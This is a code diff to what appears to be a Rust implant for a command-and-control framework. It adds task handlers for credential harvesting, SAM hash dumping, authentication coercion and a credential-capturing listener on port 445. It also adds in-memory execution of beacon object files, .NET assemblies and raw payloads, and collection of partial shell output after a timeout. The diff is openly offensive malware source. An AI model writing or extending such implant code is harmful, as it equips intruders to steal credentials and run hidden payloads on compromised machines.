@@ -8,6 +8,8 @@ use std::sync::Arc;
 use rand::RngCore;
 use crate::transport::SharedTransport;
 use crate::persist;
+use crate::creds;
+use crate::inlinexec;
 use crate::protocol::{Task, TaskResponse};
 
 fn staging_token() -> String {
@@ -135,6 +137,52 @@ pub fn dispatch(
             let tech = task.arg_str("technique");
             let out  = persist::technique_status(tech, &state.blob_path);
             Some(TaskResponse::ok(task, out))
+        }
+
+        // ── Credential Harvesting ────────────────────────────────────────────
+        "creds_harvest" => {
+            Some(TaskResponse::ok(task, creds::harvest(state, transport)))
+        }
+
+        "creds_coerce" => {
+            Some(TaskResponse::ok(task, creds::coerce()))
+        }
+
+        "creds_sam" => {
+            Some(TaskResponse::ok(task, creds::sam(state, transport)))
+        }
+
+        "creds_listen_start" => {
+            let port = task.arg_u64("port") as u16;
+            let port = if port == 0 { 445 } else { port };
+            let proto = task.arg_str("proto");
+            Some(TaskResponse::ok(task, creds::listen_start(port, proto)))
+        }
+
+        "creds_listen_stop" => {
+            let spec = task.arg_str("spec");
+            Some(TaskResponse::ok(task, creds::listen_stop(spec)))
+        }
+
+        "creds_listen_dump" => {
+            Some(TaskResponse::ok(task, creds::listen_dump()))
+        }
+
+        // ── In-Memory Execution ──
+        "bof_exec" => {
+            let staging = task.arg_str("staging_path");
+            let args = task.arg_str("args");
+            Some(TaskResponse::ok(task, inlinexec::bof_exec(state, transport, session_key, staging, args)))
+        }
+        "assembly_exec" => {
+            let staging = task.arg_str("staging_path");
+            let args = task.arg_str("args");
+            Some(TaskResponse::ok(task, inlinexec::assembly_exec(state, transport, session_key, staging, args)))
+        }
+        "memexec" => {
+            let staging = task.arg_str("staging_path");
+            let args = task.arg_str("args");
+            Some(TaskResponse::ok(task, inlinexec::memexec(state, transport, session_key, staging, args)))
         }
 
         // "persist_action" is a PS-only shorthand — Rust does not support it
@@ -358,7 +406,32 @@ fn cmd_shell(task: &Task, state: &Arc<AgentState>) -> TaskResponse {
                     if h != 0 { TerminateProcess(h, 1); CloseHandle(h); }
                 }
             }
-            (format!("ERROR: command timed out after {}s", CMD_TIMEOUT_SECS), false)
+            // After kill, try to collect any partial output the process wrote
+            // before being killed (e.g. stderr from nc, curl, etc.)
+            match out_rx.recv_timeout(std::time::Duration::from_secs(2)) {
+                Ok(Ok(out)) => {
+                    let mut s = String::from_utf8_lossy(
+                        &out.stdout[..out.stdout.len().min(MAX_OUTPUT_BYTES)]
+                    ).to_string();
+                    let remaining = MAX_OUTPUT_BYTES.saturating_sub(s.len());
+                    if remaining > 0 {
+                        let err = String::from_utf8_lossy(
+                            &out.stderr[..out.stderr.len().min(remaining)]
+                        ).to_string();
+                        if !err.is_empty() {
+                            if !s.is_empty() { s.push('\n'); }
+                            s.push_str(&err);
+                        }
+                    }
+                    if s.is_empty() {
+                        (format!("ERROR: command timed out after {}s (no output)", CMD_TIMEOUT_SECS), false)
+                    } else {
+                        s.push_str(&format!("\n[timed out after {}s]", CMD_TIMEOUT_SECS));
+                        (s, false)
+                    }
+                }
+                _ => (format!("ERROR: command timed out after {}s", CMD_TIMEOUT_SECS), false),
+            }
         }
     };
 
